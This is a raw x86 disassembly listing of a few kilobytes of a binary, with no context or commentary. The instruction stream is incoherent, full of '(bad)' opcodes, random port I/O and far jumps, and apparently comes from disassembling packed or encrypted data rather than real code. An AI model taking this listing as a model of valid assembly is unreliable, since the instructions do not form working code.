  41a796:	and    cl,BYTE PTR [ecx]
  41a798:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a799:	xchg   ebp,eax
  41a79a:	out    0x6,eax
  41a79c:	mov    esp,0xf127bf62
  41a7a1:	inc    ebx
  41a7a2:	mov    ch,0xd1
  41a7a4:	jne    0x41a771
  41a7a6:	fcmove st,st(1)
  41a7a8:	or     bh,ch
  41a7aa:	xchg   edx,eax
  41a7ab:	xchg   edx,eax
  41a7ac:	jbe    0x41a7ec
  41a7ae:	and    DWORD PTR [esi+0x1f],eax
  41a7b1:	sub    bh,dh
  41a7b3:	push   es
  41a7b4:	push   esi
  41a7b5:	in     al,0x68
  41a7b7:	jl     0x41a834
  41a7b9:	push   edi
  41a7ba:	mov    ecx,0xba37ebbc
  41a7bf:	xor    DWORD PTR [esi],0x52
  41a7c2:	jo     0x41a821
  41a7c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7c5:	xlat   BYTE PTR ds:[ebx]
  41a7c6:	cmp    DWORD PTR [ecx+0x3d],0x2f
  41a7ca:	in     al,0xab
  41a7cc:	mov    ds:0x174bcf2c,al
  41a7d1:	fdivr  DWORD PTR [edi+0x6db0c622]
  41a7d7:	(bad)
  41a7da:	pop    ecx
  41a7db:	pop    ebp
  41a7dc:	jae    0x41a821
  41a7de:	fdiv   DWORD PTR [ecx+esi*8+0x44]
  41a7e2:	jb     0x41a7a6
  41a7e4:	jo     0x41a78d
  41a7e6:	jne    0x41a7a3
  41a7e8:	push   ss
  41a7e9:	cmc    
  41a7ea:	adc    ah,BYTE PTR [ebp+0x7cc92331]
  41a7f0:	pop    ss
  41a7f1:	jbe    0x41a7b1
  41a7f3:	mov    bh,0x39
  41a7f5:	xlat   BYTE PTR ds:[ebx]
  41a7f6:	(bad)  
  41a7f7:	outs   dx,BYTE PTR ds:[esi]
  41a7f8:	mov    WORD PTR [ecx],?
  41a7fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7fb:	xor    ebp,0xffffffcf
  41a7fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7ff:	test   BYTE PTR [esp+edi*2+0x8ffe762],dl
  41a806:	mov    ah,BYTE PTR [edi-0x66]
  41a809:	push   esi
  41a80a:	pop    es
  41a80b:	mov    dh,0x90
  41a80d:	pop    eax
  41a80e:	fidivr DWORD PTR [ebx+0xc835e7c]
  41a814:	jne    0x41a841
  41a816:	rcr    BYTE PTR [edx-0x55be097a],cl
  41a81c:	jmp    0x26eb:0x4954276c
  41a823:	or     eax,0xba8b6ae8
  41a828:	imul   esp,edx,0x6beb1fb1
  41a82e:	jne    0x41a80b
  41a830:	mov    ah,BYTE PTR [ecx+eiz*4+0x38]
  41a834:	and    esi,0xca89a0af
  41a83a:	les    esi,FWORD PTR [edx+0x7caf8f12]
  41a840:	xor    edx,DWORD PTR [eax-0x68]
  41a843:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a844:	enter  0xa7a3,0xbe
  41a848:	add    ebx,DWORD PTR [esi+ecx*8]
  41a84b:	push   ss
  41a84c:	daa    
  41a84d:	dec    esi
  41a84e:	test   al,0x97
  41a850:	pop    es
  41a851:	leave  
  41a852:	inc    edx
  41a853:	daa    
  41a854:	mov    al,0x9e
  41a856:	dec    ebp
  41a857:	popa   
  41a858:	mov    eax,ds:0x427d2d7e
  41a85d:	inc    ebp
  41a85e:	fst    QWORD PTR [eax]
  41a860:	test   BYTE PTR [ecx+0x6472483e],dl
  41a866:	cdq    
  41a867:	in     al,0x30
  41a869:	rcl    DWORD PTR [edi+0xe],cl
  41a86c:	or     ah,BYTE PTR [esi+0x25]
  41a86f:	inc    esi
  41a870:	xchg   BYTE PTR [esi-0x727ca053],dl
  41a876:	in     eax,dx
  41a877:	mov    ah,0x28
  41a879:	mov    ecx,0xe83243ca
  41a87e:	outs   dx,DWORD PTR ds:[si]
  41a880:	sbb    dx,di
  41a883:	mov    es,WORD PTR [ecx-0x465779f6]
  41a889:	stos   BYTE PTR es:[edi],al
  41a88a:	or     cl,bl
  41a88c:	push   ds
  41a88d:	or     ah,BYTE PTR [ebp-0x6a]
  41a890:	test   BYTE PTR [edi-0x31bd8486],al
  41a896:	sub    DWORD PTR [edx+eiz*8+0x4a],esi
  41a89a:	pushf  
  41a89b:	dec    ebp
  41a89c:	mov    dh,0xed
  41a89e:	clc    
  41a89f:	fs ins BYTE PTR es:[edi],dx
  41a8a1:	mov    dl,0x96
  41a8a3:	jle    0x41a87d
  41a8a5:	in     al,0xc
  41a8a7:	imul   esp,DWORD PTR [edx-0x7f],0x26c631f4
  41a8ae:	pop    ebx
  41a8af:	pop    edi
  41a8b0:	out    dx,al
  41a8b1:	aad    0x85
  41a8b3:	ret    
  41a8b4:	inc    ebp
  41a8b5:	pop    esp
  41a8b6:	and    bl,BYTE PTR [ecx]
  41a8b8:	push   ecx
  41a8b9:	add    cl,al
  41a8bb:	test   ah,al
  41a8bd:	mov    DWORD PTR [esi],esp
  41a8bf:	mov    cl,0x0
  41a8c1:	imul   BYTE PTR [esi]
  41a8c3:	add    eax,0xaee393fa
  41a8c8:	bnd js 0x41a917
  41a8cb:	add    ebx,DWORD PTR [ebp-0x4]
  41a8ce:	fs sbb al,0x7c
  41a8d1:	fld    DWORD PTR [esi+0x74b90580]
  41a8d7:	adc    al,0xa7
  41a8d9:	mov    ?,esi
  41a8db:	fnstcw WORD PTR [ebp-0x2c]
  41a8de:	and    DWORD PTR [eax-0x523e21e8],ecx
  41a8e4:	pop    edi
  41a8e5:	es add eax,0xbb33e67b
  41a8eb:	shl    DWORD PTR [edx-0x5a00282f],0xff
  41a8f2:	or     ecx,DWORD PTR [ebx]
  41a8f4:	lea    edi,[esp+edx*8]
  41a8f7:	add    ch,0x57
  41a8fa:	in     al,dx
  41a8fb:	inc    eax
  41a8fc:	inc    ebx
  41a8fd:	fcomp  DWORD PTR [esi+0x20]
  41a900:	fst    DWORD PTR [ecx]
  41a902:	xor    al,BYTE PTR [ecx-0x7]
  41a905:	adc    esp,DWORD PTR [eax+0x6b0b4533]
  41a90b:	xchg   DWORD PTR [edi+ebp*4],esp
  41a90e:	fst    QWORD PTR [ebp-0x38]
  41a911:	mov    dl,BYTE PTR [ebx+0x7bd8847a]
  41a917:	jp     0x41a987
  41a919:	push   0xbc0a4a01
  41a91e:	iret   
  41a91f:	iret   
  41a920:	popa   
  41a921:	int    0x7
  41a923:	sub    al,0xaf
  41a925:	xchg   cl,ch
  41a927:	stc    
  41a928:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a929:	cmp    esp,eax
  41a92b:	add    bl,dl
  41a92d:	dec    eax
  41a92e:	pusha  
  41a92f:	cmp    BYTE PTR [ecx-0xb],ah
  41a932:	inc    edx
  41a933:	shl    dh,0xf4
  41a936:	push   ecx
  41a937:	dec    esi
  41a938:	cmc    
  41a939:	push   0x6a
  41a93b:	data16 add BYTE PTR [eax],ch
  41a93e:	inc    ecx
  41a93f:	xchg   edx,eax
  41a940:	ds repz cs jp 0x41a8db
  41a945:	sub    eax,0x3df4ba0f
  41a94a:	in     al,0xf1
  41a94c:	imul   edx,DWORD PTR [ebp+ebp*2+0x62],0xef89a7b2
  41a954:	aaa    
  41a955:	adc    eax,0x1337917
  41a95a:	mov    ah,BYTE PTR [ebp+0xc]
  41a95d:	sar    DWORD PTR [edi+0xee5307],cl
  41a963:	mov    dl,0x3a
  41a965:	fist   WORD PTR [eax]
  41a967:	jl     0x41a93e
  41a969:	rol    DWORD PTR ds:0x5bb360b2,cl
  41a96f:	daa    
  41a970:	mov    DWORD PTR ds:0x7d9d7dfa,0xcccc6138
  41a97a:	mov    ds:0xffcb2054,al
  41a97f:	adc    ecx,DWORD PTR [edi]
  41a981:	pop    ds
  41a982:	imul   ecx,ebp,0xffffff8e
  41a985:	enter  0xd0,0xaf
  41a989:	mov    dl,0x70
  41a98c:	inc    ebp
  41a98d:	jge    0x41a932
  41a98f:	rcr    BYTE PTR [edx-0x27ee91fd],0xad
  41a996:	leave  
  41a997:	hlt    
  41a998:	mov    bl,0x67
  41a99a:	xor    dl,dl
  41a99c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a99d:	es ds and eax,0x89d9885d
  41a9a4:	test   eax,0x392083a6
  41a9a9:	sti    
  41a9aa:	jo     0x41a94e
  41a9ac:	leave  
  41a9ad:	test   eax,0xb3e4c19e
  41a9b2:	loopne 0x41a9f0
  41a9b4:	ss aam 0xe6
  41a9b7:	sub    bh,ah
  41a9b9:	mov    BYTE PTR [edi-0x9],dh
  41a9bc:	enter  0x3744,0xca
  41a9c0:	xor    ah,bh
  41a9c2:	mov    DWORD PTR [ebp+0x408396f9],ebx
  41a9c8:	jle    0x41aa12
  41a9ca:	std    
  41a9cb:	in     al,0xe5
  41a9cd:	neg    BYTE PTR [edx-0x38]
  41a9d0:	dec    eax
  41a9d1:	mov    ah,0x21
  41a9d3:	cmp    eax,0x5d46fd37
  41a9d8:	pop    edi
  41a9d9:	iret   
  41a9da:	push   ebx
  41a9db:	jg     0x41a9ac
  41a9dd:	xor    eax,0x4492ab7a
  41a9e2:	in     al,dx
  41a9e3:	hlt    
  41a9e4:	push   0xffffffab
  41a9e6:	shl    BYTE PTR [eax+0x8a5f16d],cl
  41a9ec:	sbb    eax,0x45b56efe
  41a9f1:	icebp  
  41a9f2:	stos   DWORD PTR es:[edi],eax
  41a9f3:	inc    eax
  41a9f4:	in     al,dx
  41a9f5:	mov    ch,0xf3
  41a9f7:	or     cl,BYTE PTR [esi+0x7c2d8837]
  41a9fd:	xor    edx,DWORD PTR [edi]
  41a9ff:	sbb    al,0xa9
  41aa01:	jle    0x41a9b8
  41aa03:	fwait
  41aa04:	popf   
  41aa05:	and    al,0x16
  41aa07:	mov    esi,0x694309e0
  41aa0c:	xor    eax,0x20828a06
  41aa11:	push   edx
  41aa12:	and    edi,DWORD PTR [esi+ebx*1]
  41aa15:	cmc    
  41aa16:	sub    al,0xf2
  41aa18:	mov    ebx,edi
  41aa1a:	jg     0x41a9e5
  41aa1c:	or     eax,0xc41d6cb8
  41aa21:	jmp    0x63b8f2a2
  41aa26:	jns    0x41a9b7
  41aa28:	pop    es
  41aa29:	out    0xff,al
  41aa2b:	std    
  41aa2c:	das    
  41aa2d:	xor    ah,BYTE PTR [ebx+ecx*8]
  41aa30:	add    DWORD PTR [edx+edx*2-0x5b6ba944],esi
  41aa37:	mov    ds:0xe7a13be0,al
  41aa3c:	mov    eax,cs:0xb8208a74
  41aa42:	outs   dx,BYTE PTR ds:[esi]
  41aa43:	inc    eax
  41aa44:	mov    es,WORD PTR [esi-0x7b]
  41aa47:	shl    DWORD PTR [edx],cl
  41aa49:	ss xchg edx,eax
  41aa4b:	push   0xffffffac
  41aa4d:	sbb    dh,BYTE PTR [edi-0x5a]
  41aa50:	push   ss
  41aa51:	(bad)  [ebx-0x5d]
  41aa54:	repnz loopne 0x41aad0
  41aa57:	call   DWORD PTR [ebx]
  41aa59:	sbb    BYTE PTR [eax],cl
  41aa5b:	nop
  41aa5c:	scas   al,BYTE PTR es:[edi]
  41aa5d:	icebp  
  41aa5e:	in     eax,0xe7
  41aa60:	ret    0x5b4
  41aa63:	cli    
  41aa64:	and    eax,0xbb9a0c1b
  41aa69:	inc    edi
  41aa6a:	sti    
  41aa6b:	call   0xe81:0x98b888b4
  41aa72:	call   0xaa5f9254
  41aa77:	push   ecx
  41aa78:	inc    edx
  41aa79:	push   0xffffff86
  41aa7b:	hlt    
  41aa7c:	xor    al,0xc5
  41aa7e:	daa    
  41aa7f:	mov    bl,0x4d
  41aa81:	cwde   
  41aa82:	mov    fs,esi
  41aa84:	and    al,0xa6
  41aa86:	sub    ah,BYTE PTR [edi-0x2b]
  41aa89:	dec    ebp
  41aa8a:	adc    eax,0xeacaa5b3
  41aa8f:	imul   edi,DWORD PTR [edi+0x78],0xffffff83
  41aa93:	xchg   ecx,eax
  41aa94:	xchg   ecx,eax
  41aa95:	(bad)  
  41aa96:	push   esp
  41aa97:	jae    0x41aae3
  41aa99:	gs out dx,eax
  41aa9b:	sbb    BYTE PTR [edi-0x55871c6b],ch
  41aaa1:	xor    ebx,0xffffffc7
  41aaa4:	imul   eax,eax,0xffffffb9
  41aaa7:	pop    edx
  41aaa8:	retf   0xb23
  41aaab:	push   esi
  41aaac:	add    al,BYTE PTR [esp+edx*1+0x467d27da]
  41aab3:	push   es
  41aab4:	xor    esi,DWORD PTR [ebx+eax*2]
  41aab7:	fisub  DWORD PTR [edx-0x425d779a]
  41aabd:	je     0x41aa49
  41aabf:	jge    0x41aa43
  41aac1:	inc    esi
  41aac2:	mov    ebx,0x19c6ed78
  41aac7:	fisub  DWORD PTR [esi-0x3e53f560]
  41aacd:	sub    cl,BYTE PTR [eax+0xb]
  41aad0:	mov    eax,cs
  41aad2:	sti    
  41aad3:	push   ebp
  41aad4:	xor    dl,BYTE PTR [edx-0x33503109]
  41aada:	test   DWORD PTR [ebp+0x2d],ecx
  41aadd:	pop    ebp
  41aade:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aadf:	test   DWORD PTR [eax+0x3309afcd],edi
  41aae5:	call   0x199104d6
  41aaea:	sub    DWORD PTR [ecx+0x7e],esp
  41aaed:	aaa    
  41aaee:	push   edi
  41aaef:	out    dx,eax
  41aaf0:	dec    eax
  41aaf1:	cmp    ch,BYTE PTR [ebp+ecx*1-0x21]
  41aaf5:	loop   0x41aa97
  41aaf7:	cmp    BYTE PTR [edi],al
  41aaf9:	(bad)
  41aafc:	repz mov eax,ds:0x71a75f1d
  41ab02:	repnz add eax,0x7012aecb
  41ab08:	add    eax,0x7b9ab5c1
  41ab0d:	cwde   
  41ab0e:	ds aam 0xb9
  41ab11:	and    DWORD PTR [ebx-0x20],0x8178a3
  41ab18:	(bad)  
  41ab19:	mov    al,ds:0x60331860
  41ab1e:	xchg   ecx,eax
  41ab1f:	test   al,0x42
  41ab21:	aad    0x43
  41ab23:	enter  0xbcd9,0x91
  41ab27:	fwait
  41ab28:	inc    eax
  41ab29:	mov    ch,0x72
  41ab2b:	das    
  41ab2c:	in     al,0x11
  41ab2e:	sbb    edx,DWORD PTR [ebx-0x14]
  41ab31:	adc    ch,bh
  41ab33:	xor    ebx,esi
	...
  41ad05:	inc    ecx
  41ad06:	inc    BYTE PTR [ebx+eiz*1-0x1188441]
  41ad0d:	push   ecx
  41ad0e:	jecxz  0x41ad35
  41ad10:	arpl   WORD PTR [edi+0x9],ax
  41ad13:	cmp    al,0x3b
  41ad15:	cmp    eax,DWORD PTR [ebp+0x7200001]
  41ad1b:	add    BYTE PTR [eax],al
  41ad1d:	cdq    
  41ad1e:	mov    ds:0x7828db3e,al
  41ad23:	lds    eax,FWORD PTR [ebx]
  41ad25:	ins    BYTE PTR es:[edi],dx
  41ad26:	pop    ebx
  41ad27:	repz gs jnp 0x41ad9d
  41ad2b:	inc    esp
  41ad2c:	mov    ecx,0x17eb73fb
  41ad31:	sbb    al,0x8b
  41ad33:	into   
  41ad34:	aam    0x48
  41ad36:	enter  0x2074,0xd5
  41ad3a:	pop    ecx
  41ad3b:	dec    ecx
  41ad3c:	je     0x41acd0
  41ad3e:	mov    cl,0x4b
  41ad40:	pop    ebx
  41ad41:	ror    ebx,0x2e
  41ad44:	cmp    eax,0x11a72df3
  41ad49:	test   BYTE PTR [eax],dh
  41ad4b:	jge    0x41ada2
  41ad4d:	xlat   BYTE PTR ds:[ebx]
  41ad4e:	xor    eax,0xae8a3574
  41ad53:	into   
  41ad54:	je     0x41acdd
  41ad56:	add    DWORD PTR [ebp-0x13],ebp
  41ad59:	dec    ebx
  41ad5a:	cs pop edx
  41ad5c:	scas   eax,DWORD PTR es:[edi]
  41ad5d:	and    DWORD PTR [ebp+0x26],edx
  41ad60:	jbe    0x41ad2b
  41ad62:	and    DWORD PTR [eax],eax
  41ad64:	inc    ebp
  41ad65:	pop    ss
  41ad66:	enter  0x8d9,0x4
  41ad6a:	scas   eax,DWORD PTR es:[edi]
  41ad6b:	int    0x15
  41ad6d:	outs   dx,BYTE PTR ds:[esi]
  41ad6e:	(bad)  
  41ad6f:	mov    edi,DWORD PTR [ebx+ecx*4-0x5ba2d65]
  41ad76:	mov    edi,0x14a444b9
  41ad7b:	dec    edx
  41ad7c:	sub    al,BYTE PTR [ecx-0x38]
  41ad7f:	jne    0x41ad7f
  41ad81:	xchg   esp,eax
  41ad82:	test   DWORD PTR [edx+0x7d],0x65cca6c7
  41ad89:	push   ds
  41ad8a:	mov    edx,DWORD PTR [ebx]
  41ad8c:	inc    esi
  41ad8d:	and    edi,DWORD PTR ds:0x2bcf5f41
  41ad93:	jg     0x13dd4dcf
  41ad99:	mov    DWORD PTR [ecx+0x4466483e],eax
  41ad9f:	loope  0x41ad2f
  41ada1:	std    
  41ada2:	xchg   edi,eax
  41ada3:	int    0x18
  41ada5:	push   es
  41ada6:	leave  
  41ada7:	call   0x4231:0x91cecdba
  41adae:	aas    
  41adaf:	adc    BYTE PTR [edx-0x2f0b71b6],bl
  41adb5:	je     0x41adf9
  41adb7:	pop    ds
  41adb8:	jns    0x41ad9f
  41adba:	push   cs
  41adbb:	adc    BYTE PTR [esi-0xf],al
  41adbe:	mov    eax,ds:0xa7f88beb
  41adc3:	into   
  41adc4:	inc    DWORD PTR [ebp+0x311b0b76]
  41adca:	or     edi,DWORD PTR [ecx]
  41adcc:	cli    
  41adcd:	jbe    0x41adaa
  41adcf:	xor    eax,0x8033a32d
  41add4:	retf   0xeb5
  41add7:	mov    BYTE PTR [ebx],dh
  41add9:	(bad)  
  41adda:	scas   al,BYTE PTR es:[edi]
  41addb:	(bad)  
  41addc:	popa   
  41addd:	pop    ds
  41adde:	jno    0x41adf8
  41ade0:	sub    DWORD PTR ds:0x82a9ff98,ebp
  41ade6:	cmp    DWORD PTR [edi],ebx
  41ade8:	and    eax,0x4b19c66e
  41aded:	jp     0x41ae36
  41adef:	dec    ecx
  41adf0:	cwde   
  41adf1:	xchg   ebp,eax
  41adf2:	lahf   
  41adf3:	add    eax,0xaf42e353
  41adf8:	ja     0x41ae76
  41adfa:	cmp    BYTE PTR [eax],ah
  41adfc:	or     ch,ah
  41adfe:	loopne 0x41ae1c
  41ae00:	mov    DWORD PTR [eax],esp
  41ae02:	addr16 cwde 
  41ae04:	mov    BYTE PTR [eax+0x10],al
  41ae07:	mov    bl,0x92
  41ae09:	xor    BYTE PTR [edx+0x6d1881c6],cl
  41ae0f:	jo     0x41ae27
  41ae11:	or     esp,edi
  41ae13:	and    eax,0xa3bf902f
  41ae18:	arpl   si,dx
  41ae1a:	sub    eax,0xe9a0a626
  41ae1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae20:	imul   ebx,DWORD PTR [edx+esi*8],0x3dd700f4
  41ae27:	cmp    dh,BYTE PTR [ebx-0x594b6d5b]
  41ae2d:	test   BYTE PTR [edx],al
  41ae2f:	and    esi,DWORD PTR [ecx+0x7e25dd44]
  41ae35:	(bad)  
  41ae36:	sub    BYTE PTR gs:[ecx-0x47],bh
  41ae3a:	cmp    ch,ch
  41ae3c:	out    dx,al
  41ae3d:	pop    edi
  41ae3e:	repnz add ch,BYTE PTR [ecx+0x51]
  41ae42:	retw   0x8280
  41ae46:	ret    0x649c
  41ae49:	rcr    BYTE PTR [edx-0x7d0d1568],0x8f
  41ae50:	dec    esi
  41ae51:	add    ebx,eax
  41ae53:	mov    ebx,DWORD PTR [edi+0x35]
  41ae56:	push   0x17
  41ae58:	(bad)  
  41ae59:	add    BYTE PTR [eax+0x29],0x50
  41ae5d:	bound  edx,QWORD PTR [esi+0x51]
  41ae60:	or     BYTE PTR [edx+0x35],ah
  41ae63:	mov    ebx,0x102e27c6
  41ae68:	xchg   esp,eax
  41ae69:	pop    ds
  41ae6a:	push   ebx
  41ae6b:	push   0x6b96c440
  41ae70:	mov    dh,0xe9
  41ae72:	xor    eax,0xcf56721a
  41ae77:	lock imul ecx,esi,0x8c6d9385
  41ae7e:	rcl    DWORD PTR [ebx],1
  41ae80:	lock cmp edx,esi
  41ae83:	sbb    eax,0xfa5fb826
  41ae88:	push   fs
  41ae8a:	sbb    eax,0x6a1390fe
  41ae8f:	aas    
  41ae90:	inc    esi
  41ae91:	inc    ebx
  41ae92:	in     eax,dx
  41ae93:	test   BYTE PTR [ecx+ecx*8+0x7a51ee15],bl
  41ae9a:	out    dx,al
  41ae9b:	daa    
  41ae9c:	ja     0x41aeb0
  41ae9e:	add    BYTE PTR [ecx+0x4],dl
  41aea1:	fdiv   QWORD PTR [eax]
  41aea3:	adc    edx,DWORD PTR [edx]
  41aea5:	mov    ds:0x48687811,al
  41aeaa:	bound  ecx,QWORD PTR [eax]
  41aeac:	push   ebx
  41aead:	jns    0x41ae53
  41aeaf:	ja     0x41aebf
  41aeb1:	aas    
  41aeb2:	sti    
  41aeb3:	(bad)  
  41aeb4:	push   ecx
  41aeb5:	cmc    
  41aeb6:	aad    0x1f
  41aeb8:	cmc    
  41aeb9:	or     BYTE PTR [esi],ch
  41aebb:	fiadd  WORD PTR [ebx]
  41aebd:	arpl   WORD PTR [ecx+ebp*8],dx
  41aec0:	mov    dh,0x80
  41aec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aec3:	stc    
  41aec4:	aaa    
  41aec5:	ret    
  41aec6:	sub    ecx,edx
  41aec8:	(bad)  
  41aec9:	pop    ss
  41aeca:	push   ds
  41aecb:	jle    0x41aeae
  41aecd:	cld    
  41aece:	pushf  
  41aecf:	das    
  41aed0:	test   al,0x76
  41aed2:	pop    edi
  41aed3:	sub    eax,0x617d6978
  41aed8:	pusha  
  41aed9:	or     edx,eax
  41aedb:	sub    DWORD PTR [edi+0x58b8758f],edi
  41aee1:	inc    edi
  41aee2:	or     ah,BYTE PTR [edi-0x14d4298e]
  41aee8:	jae    0x41aeef
  41aeea:	pop    es
  41aeeb:	rol    DWORD PTR [edx-0x7ea709fb],1
  41aef1:	lods   al,BYTE PTR ds:[esi]
  41aef2:	jo     0x41af65
  41aef4:	xchg   edx,eax
  41aef5:	clc    
  41aef6:	test   BYTE PTR [edx-0x46c5c453],ch
  41aefc:	scas   al,BYTE PTR es:[edi]
  41aefd:	jg     0x41af49
  41aeff:	(bad)  
  41af00:	in     eax,dx
  41af01:	pop    eax
  41af02:	pop    esp
  41af03:	(bad)  
  41af04:	neg    DWORD PTR [ecx+0x33]
  41af07:	jp     0x41aeb6
  41af09:	cmp    BYTE PTR [ebx+0x40],bh
  41af0c:	mov    bh,0x8c
  41af0e:	scas   eax,DWORD PTR es:[edi]
  41af0f:	je     0x41ae94
  41af11:	sub    al,0xf6
  41af13:	mov    cl,0x44
  41af15:	addr16 pop ebp
  41af17:	xchg   ebp,eax
  41af18:	inc    esp
  41af19:	push   ds
  41af1a:	fsubrp st(3),st
  41af1c:	sbb    eax,0xe79290e
  41af21:	or     eax,0xfefb1386
  41af26:	push   es
  41af27:	lds    edx,FWORD PTR [ecx]
  41af29:	popf   
  41af2a:	popa   
  41af2b:	pop    esp
  41af2c:	test   eax,0x44addc52
  41af31:	sti    
  41af32:	test   al,0x77
  41af34:	popf   
  41af35:	sub    BYTE PTR [edi+0x28],cl
  41af38:	xchg   edx,eax
  41af39:	outs   dx,BYTE PTR ds:[esi]
  41af3a:	xchg   DWORD PTR [edx-0x38],esi
  41af3d:	test   BYTE PTR [eax-0x80],al
  41af40:	push   0x30
  41af42:	add    ebx,esi
  41af44:	sti    
  41af45:	ss ja  0x41af38
  41af48:	loopne 0x41aed1
  41af4a:	stos   DWORD PTR es:[edi],eax
  41af4b:	daa    
  41af4c:	test   esp,ecx
  41af4e:	cld    
  41af4f:	sar    BYTE PTR [ecx+0x7cb66eae],1
  41af55:	ret    0x2cf6
  41af58:	lods   eax,DWORD PTR ds:[esi]
  41af59:	mov    ecx,0x50a466eb
  41af5e:	sub    ebp,edi
  41af60:	cwde   
  41af61:	hlt    
  41af62:	loope  0x41af7a
  41af64:	cmp    dl,ah
  41af66:	mov    al,BYTE PTR [ebp+0x4a]
  41af69:	dec    esi
  41af6a:	sbb    DWORD PTR [edx+0x6b],edi
  41af6d:	mov    al,ds:0x8e201765
  41af72:	cmp    al,0x7
  41af74:	fistp  QWORD PTR [edi]
  41af76:	icebp  
  41af77:	rcr    BYTE PTR ds:0x2ded077d,1
  41af7d:	mov    edx,DWORD PTR [ebp-0x25]
  41af80:	popf   
  41af81:	xchg   esi,eax
  41af82:	add    al,0xcf
  41af84:	mov    BYTE PTR [edx-0x47],ch
  41af87:	outs   dx,DWORD PTR ds:[esi]
  41af88:	ins    DWORD PTR es:[edi],dx
  41af89:	mov    ebp,0xf644c1ca
  41af8e:	dec    esp
  41af8f:	sbb    eax,0xd14ee780
  41af94:	sahf   
  41af95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af97:	dec    ecx
  41af98:	(bad)  
  41af99:	cs jecxz 0x41b009
  41af9c:	shl    edi,0x22
  41af9f:	into   
  41afa0:	mov    edx,0x1203b43d
  41afa5:	mov    fs,edx
  41afa7:	pop    ebp
  41afa8:	xrelease mov BYTE PTR ds:0x3138a950,dl
  41afaf:	sub    edx,DWORD PTR [ebx-0x7f]
  41afb2:	pop    es
  41afb3:	dec    ebp
  41afb4:	clc    
  41afb5:	jmp    0xcca1:0xe37d7886
  41afbc:	jb     0x41b005
  41afbe:	call   0xe488:0x4eb0af64
  41afc5:	aam    0xcb
  41afc7:	add    edi,DWORD PTR [edi-0x384af1f1]
  41afcd:	popa   
  41afce:	push   0xb4f40501
  41afd3:	sbb    DWORD PTR [esi+0x6721027a],ebp
  41afd9:	and    eax,DWORD PTR [edi+esi*4+0xdab0e6e]
  41afe0:	mov    al,ds:0xb9e86bf9
  41afe5:	loopne 0x41b061
  41afe7:	ds rcl dh,cl
  41afea:	push   ecx
  41afeb:	scas   eax,DWORD PTR es:[edi]
  41afec:	mov    DWORD PTR [ecx-0x4bc0319b],ebp
  41aff2:	push   edx
  41aff3:	ja     0x41b006
  41aff5:	mov    ch,0x7a
  41aff7:	idiv   DWORD PTR [esi]
  41aff9:	test   DWORD PTR [ecx+esi*2],ebx
  41affc:	test   DWORD PTR [eax],0x3dcde041
  41b002:	sar    BYTE PTR [edx-0x10],cl
  41b005:	jg     0x41b06c
  41b007:	int3   
  41b008:	or     al,0x50
  41b00a:	and    BYTE PTR [edx+0x30],dh
  41b00d:	aam    0x2
  41b00f:	and    BYTE PTR [ebx+0x214a5b11],0x65
  41b016:	(bad)  
  41b017:	(bad)  
  41b018:	out    dx,eax
  41b019:	sbb    eax,0x28100825
  41b01e:	out    0xc9,eax
  41b020:	xor    DWORD PTR [ecx],0x6726b49e
  41b026:	(bad)  
  41b027:	jge    0x41b0a6
  41b029:	retf   
  41b02a:	icebp  
  41b02b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b02c:	out    0x4b,eax
  41b02e:	pop    esi
  41b02f:	mov    esp,DWORD PTR [ebx+0x3dd4e5c7]
  41b035:	gs mov cl,0x21
  41b038:	daa    
  41b039:	fimul  WORD PTR [edx+0x3f7c2b6]
  41b03f:	dec    edx
  41b040:	mov    ss,WORD PTR [eax-0x8]
  41b043:	sbb    edx,DWORD PTR [ecx+ebx*1]
  41b046:	outs   dx,DWORD PTR ds:[esi]
  41b047:	loope  0x41b05a
  41b049:	sub    eax,0x64269c94
  41b04e:	mov    ch,0x40
  41b050:	sbb    BYTE PTR [ebx-0x35],0x3d
  41b054:	popf   
  41b055:	jae    0x41aff2
  41b057:	jne    0x41afdb
  41b059:	push   0xc63d4380
  41b05e:	pop    es
  41b05f:	mov    ah,0xfa
  41b061:	js     0x41b03f
  41b063:	repz imul ebp,DWORD PTR [ebx+0x6f],0x854daac2
  41b06b:	sar    BYTE PTR [ebx+0x11f5308c],cl
  41b071:	(bad)  
  41b072:	out    dx,al
  41b073:	aas    
  41b074:	fbld   TBYTE PTR [eax]
  41b076:	push   0xffffffb2
  41b078:	lods   eax,DWORD PTR ds:[esi]
  41b079:	jno    0x41b03b
  41b07b:	aam    0x7
  41b07d:	lahf   
  41b07e:	add    DWORD PTR [ebp-0x378579f1],eax
  41b084:	stos   DWORD PTR es:[edi],eax
  41b085:	push   esi
  41b086:	or     BYTE PTR [ebx+0x39cfeaab],bl
  41b08c:	xor    bl,cl
  41b08e:	ins    BYTE PTR es:[edi],dx
  41b08f:	int    0x7b
  41b091:	pusha  
  41b092:	sub    dh,BYTE PTR [ebx]
  41b094:	adc    eax,0x446bb274
  41b099:	inc    eax
  41b09a:	xchg   BYTE PTR ds:0x3e7e2a24,dl
  41b0a0:	mov    esp,0x566929f9
  41b0a5:	cmp    eax,DWORD PTR [edx]
  41b0a7:	arpl   WORD PTR [edx+eax*4-0x6f],bp
  41b0ab:	pop    ss
  41b0ac:	xchg   esi,eax
  41b0ad:	and    BYTE PTR [esi-0x2986f437],al
  41b0b3:	lods   al,BYTE PTR ds:[esi]
  41b0b4:	sub    al,0x9f
  41b0b6:	fnsave [edi-0x5c]
  41b0b9:	mov    dh,0xe6
  41b0bb:	adc    BYTE PTR [edi-0x55],ch
  41b0be:	scas   al,BYTE PTR es:[edi]
  41b0bf:	sbb    al,0x82
  41b0c1:	pushf  
  41b0c2:	dec    edi
  41b0c3:	aam    0x7f
  41b0c5:	aas    
  41b0c6:	mov    al,0xdb
  41b0c8:	test   eax,0x14c9245
  41b0cd:	or     BYTE PTR [ebp+0x198be66e],cl
  41b0d3:	out    0x5d,al
